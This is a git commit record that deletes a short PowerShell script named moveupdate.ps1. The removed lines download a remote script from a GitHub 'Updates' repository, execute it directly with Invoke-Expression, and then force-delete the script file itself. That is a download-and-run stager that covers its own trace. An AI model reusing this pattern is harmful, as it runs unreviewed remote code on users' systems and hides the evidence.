83e9e5a04a1706258ff21c631a7c0d83a3f916c8
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-22 21:00:44 +0100

    Delete moveupdate.ps1

--- moveupdate.ps1
+++
@@ -1,5 +0,0 @@
-Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/move.ps1" -UseBasicParsing).Content
-
-$scriptPath = $MyInvocation.MyCommand.Path
-
-Remove-Item -Path $scriptPath -Force
